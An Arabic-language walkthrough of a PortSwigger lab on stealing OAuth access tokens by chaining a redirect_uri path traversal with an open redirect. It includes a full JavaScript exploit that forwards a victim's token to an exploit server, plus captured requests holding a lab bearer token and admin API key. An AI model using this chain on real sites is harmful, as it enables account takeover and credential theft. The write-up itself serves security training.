# Lab : Stealing OAuth access tokens via an open redirect

https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect

- الفكره من الLab ده

```bash
1. <script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0a3e001c031ca9d9818073b902bf00ce.oauth-server.net/auth?client_id=gcfyfirxuadnhmf0l0yti&redirect_uri=https://0a55008b0309a9db814475c900300089.web-security-academy.net/oauth-callback/..%2Fpost%2Fnext%3Fpath%3Dhttps%3A%2F%2Fexploit-0a8e0066032aa9ae81b274e901a10043.exploit-server.net%2Fexploit&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>   =======> > > { 1. store , 2. view , 3. deliver }

2. GET /me HTTP/2
Host: oauth-0a3e001c031ca9d9818073b902bf00ce.oauth-server.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a55008b0309a9db814475c900300089.web-security-academy.net/
Authorization: Bearer P-x_ZHQ-BwKOT7csQWGpYT-GbTuSrK0zvuX2fvga3eX
Content-Type: application/json
Origin: https://0a55008b0309a9db814475c900300089.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Priority: u=4
Te: trailers

3. HTTP/2 200 OK
X-Powered-By: Express
Vary: Origin
Access-Control-Allow-Origin: https://0a55008b0309a9db814475c900300089.web-security-academy.net
Access-Control-Expose-Headers: WWW-Authenticate
Pragma: no-cache
Cache-Control: no-cache, no-store
Content-Type: application/json; charset=utf-8
Date: Tue, 29 Sep 2026 22:55:47 GMT
Keep-Alive: timeout=5
Content-Length: 152

{"sub":"administrator","apikey":"263ptLLzrUVdYgF78kVjdSbVxpPHGMnZ","name":"Administrator","email":"administrator@normal-user.net","email_verified":true}
```

اللاب ده من أعقد لابات سلسلة OAuth، وبيجمع بين **3 ثغرات مختلفة** مع بعض:

1. **Path Traversal في الـ `redirect_uri`** (يتخطى الـ whitelist validation).
2. **Open Redirect** في صفحة تانية في التطبيق (`/post/next`).
3. **استخدام OAuth Implicit Flow** (اللي بيرجع الـ access token مباشرة في الـ URL fragment بدل authorization code).

الهدف النهائي: **سرقة access token بتاع الـ admin**، واستخدامه عشان تجيب **الـ API key** بتاعه من endpoint خاص (`/me`) — مش بس تسجل دخول بحسابه عاديًا.

### المفاهيم الأساسية اللي محتاج تفهمها

#### إيه الفرق عن اللاب السابق (redirect_uri المفتوح بالكامل)؟

في اللاب اللي فات، الـ `redirect_uri` **معندوش أي تحقق خالص**. هنا **فيه تحقق (whitelist)**، لكن الـ whitelist دي **قابلة للتخطي عن طريق Path Traversal** (`/../`).

#### إيه هو الـ Implicit Flow وليه هنا الـ Token بيظهر في الـ URL؟

في الـ **OAuth Implicit Flow**، بدل ما الـ `redirect_uri` يستقبل **authorization code** (زي اللابات السابقة)، بيستقبل **الـ access token مباشرة**، وبيتحط في **الـ URL كـ fragment** (بعد علامة `#`):

```
https://client-app.com/callback#access_token=SECRET_TOKEN
```

**مهم جدًا**: الـ **fragment** (اللي بعد `#`) **مش بيتبعت للسيرفر خالص** — هو بس متاح للـ JavaScript الشغال في المتصفح. فلو قدرت تخلي المتصفح "يوديك" لصفحة بتحتوي على JavaScript بتاعك، تقدر **تقرا الـ fragment ده بـ JS** وتسرقه.

### خطوات الحل بالتفصيل

#### 1. افهم الـ Flow الأساسي

كمّل عملية OAuth login عادي، ولاحظ إن الموقع بيعمل استعلام لـ:

```
GET /me
```

عشان يجيب بيانات المستخدم (بما فيها API key). ابعت الطلب ده على Repeater.

#### 2. اختبر الـ redirect_uri

جرب تحط دومين خارجي كـ `redirect_uri` — هيترفض (فيه whitelist). لكن جرب **تضيف حروف زيادة** للقيمة الافتراضية (زي `/../`)، ولاحظ إنه **بيتقبل من غير رفض**!

#### 3. أكد ثغرة الـ Path Traversal في redirect_uri

جرب:

```
https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1
```

لاحظ إنك بتتحول فعليًا لصفحة `/post?postId=1` — يعني الـ `/../` بيتفسر ويشتغل عادي، والـ whitelist **بتفحص الشكل الظاهري بس (`oauth-callback/...`)**، مش المسار الفعلي بعد الـ resolve.

**مهم**: لاحظ إن **access token بيظهر في الـ URL كـ fragment** بعد الـ redirect.

#### 4. اكتشف الـ Open Redirect التاني

دوّر في صفحات المدونة، هتلاقي زرار **"Next post"** بيشتغل عن طريق:

```
GET /post/next?path=[...]
```

جرب تلاعب في الـ `path` parameter — هتلاقي إنه **open redirect حقيقي**، تقدر تحط فيه **رابط مطلق (absolute URL) لأي دومين خارجي** (زي exploit server بتاعك).

#### 5. اجمع الثغرتين مع بعض

الفكرة: نخلي الـ `redirect_uri` **يستخدم الـ path traversal** عشان "يهرب" من `/oauth-callback` ويوديك لـ `/post/next` **بمسار مصمم بدقة**، وبعدين الـ `path` parameter بتاع `/post/next` **يوديك فعليًا لسيرفرك (exploit server)**:

```
https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email
```

**تحليل الرابط**:

- `redirect_uri` بيتحقق منه ويعدي الفحص (لأنه ظاهريًا بيبدأ بـ `oauth-callback` — المسار المسموح).
- بعد التخطي، فعليًا بيوديك لـ `/post/next?path=https://exploit-server.net/exploit`.
- `/post/next` بيعمل redirect **تاني** لـ `exploit-server.net/exploit` (بسبب الـ open redirect).
- `response_type=token` يعني إحنا طالبين **Implicit Flow** — الـ access token هيتحط في الـ **fragment** بتاع الـ URL النهائي.

#### 6. اختبر الرابط

افتحه في المتصفح، لازم تتحول لصفحة الـ exploit server، ومعاك access token في الـ URL fragment.

#### 7. اكتب سكريبت يسرق الـ Fragment

بما إن الـ fragment **مبيتبعتش للسيرفر تلقائيًا**، لازم نستخدم **JavaScript** عشان نقراه ونحوله لحاجة تتبعت (زي query parameter، اللي بيتسجل في الـ access log):

على `/exploit` في exploit server:

html

```html
<script>window.location = '/?'+document.location.hash.substr(1)</script>
```

**الشرح**: `document.location.hash` بترجع الـ fragment كامل (بما فيه الـ `#`)، والـ `.substr(1)` بيشيل الـ `#` نفسها. السكريبت بيعمل **redirect تاني** لنفس السيرفر، لكن المرة دي بيحط الـ token كـ **query parameter** (اللي **بيتسجل في access logs عادي**، عكس الـ fragment).

#### 8. اختبر السكريبت

احفظه وافتح الرابط الملغوم تاني، وتأكد من الـ access log إن فيه طلب:

```
GET /?access_token=[...]
```

#### 9. اجمع كل حاجة في exploit واحد كامل للضحية

عشان الهجوم يشتغل بشكل كامل تلقائي، نحتاج سكريبت واحد بيعمل الخطوتين مع بعض (يبدأ الـ OAuth flow، وبعدين يسرق الـ fragment):

html

```html
<script>    if (!document.location.hash) {        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'    } else {        window.location = '/?'+document.location.hash.substr(1)    }</script>
```

**منطق السكريبت**:

- **أول مرة** (لما الضحية يفتح الصفحة): مفيش fragment (`document.location.hash` فاضي) → السكريبت بيبدأ عملية الـ OAuth كاملة (الرابط الملغوم من خطوة 5).
- الـ OAuth flow بيتم، وبيرجّع الضحية لنفس الصفحة **لكن المرة دي مع الـ access token في الـ fragment**.
- **المرة التانية**: بما إن فيه fragment دلوقتي، السكريبت بيسرقه ويحوّله لـ query parameter عن طريق redirect تاني.

#### 10. سلّم الـ Exploit للضحية (Admin)

دوس **"Deliver exploit to victim"**. الـ admin هيمر بكل الخطوات دي تلقائيًا (من غير ما يلاحظ حاجة غير refresh بسيط للصفحة)، وهتلاقي في الـ access log طلب:

```
GET /?access_token=STOLEN-TOKEN
```

#### 11. استخدم الـ Token المسروق

خد الـ token ده، وفي **Burp Repeater**، روح لطلب `GET /me`، واستبدل التوكن في هيدر:

```
Authorization: Bearer STOLEN-TOKEN
```

ابعت الطلب. هتلاقي **بيانات الضحية (admin) كاملة**، بما فيها **الـ API key**.

#### 12. سلّم الحل

خد الـ API key، وقدّمها في زرار **"Submit solution"** أعلى صفحة اللاب.

### ليه ده بيحصل تقنيًا (تلخيص الثغرات الثلاث)

#### الثغرة الأولى: Path Traversal في redirect_uri validation

python

```python
def is_valid_redirect_uri(uri):    return uri.startswith("https://lab-id.com/oauth-callback")   # ❌ فحص "بداية النص" بس
```

نفس فكرة لاب **"validation of start of path"** اللي شرحناه في الـ Path Traversal بالظبط — الفحص بيتأكد من **بداية النص**، لكن مش بيعمل **resolve** للمسار الفعلي بعد أي `/../`.

#### الثغرة الثانية: Open Redirect في /post/next

python

```python
@app.route("/post/next")def next_post():    path = request.args.get("path")    return redirect(path)   # ❌ مفيش أي تحقق إن path ده داخلي بس
```

#### الثغرة الثالثة: استخدام Implicit Flow (تصميميًا أضعف)

الـ Implicit Flow بطبيعته **بيحط الـ token في الـ URL**، وده بيخليه **عرضة للتسريب** بطرق زي دي (عن طريق الـ Referer header، أو الـ browser history، أو زي هنا عن طريق JavaScript injection في صفحة وسيطة).

### الدرس المستفاد

- **الـ redirect_uri whitelist لازم تتحقق من المسار "بعد" الـ resolve الكامل (canonical path)**، مش من الـ string الخام كما هو مكتوب — تمامًا زي فحص path traversal العادي.
- **Open redirects داخل نفس التطبيق ممكن تُستخدم كـ "قفزة" (pivot) لتجاوز قيود أمنية في مكان تاني تمامًا (هنا الـ OAuth redirect_uri)** — أي open redirect، حتى لو شكله "بسيط" ومش خطير لوحده، ممكن يتحول لجزء أساسي من هجوم أعقد.
- **الـ OAuth Implicit Flow (`response_type=token`) أضعف أمنيًا من الـ Authorization Code Flow (`response_type=code`)**، لأن التوكن بيظهر مباشرة في الـ URL — المعيار الحديث (OAuth 2.1) بيوصي بإلغاء الـ Implicit Flow تمامًا لصالح Authorization Code Flow مع PKCE.
- **الـ URL fragment (بعد `#`) له خصوصية معينة**: مش بيتبعت للسيرفر، لكن **أي JavaScript شغال في نفس الصفحة يقدر يقراه** — وده سلاح ذو حدين: بيحمي من تسريب عرضي عن طريق السيرفر logs، لكن بيفتح باب لو قدر مهاجم يحقن كود JS في نفس السياق.
- ده مثال متقدم جدًا على **تسلسل هجمات (Attack Chaining)** — كل ثغرة لوحدها كانت هتبان "متوسطة الخطورة"، لكن دمجهم مع بعض بذكاء أنتج **استيلاء كامل على حساب admin مع سرقة API key حساس**.
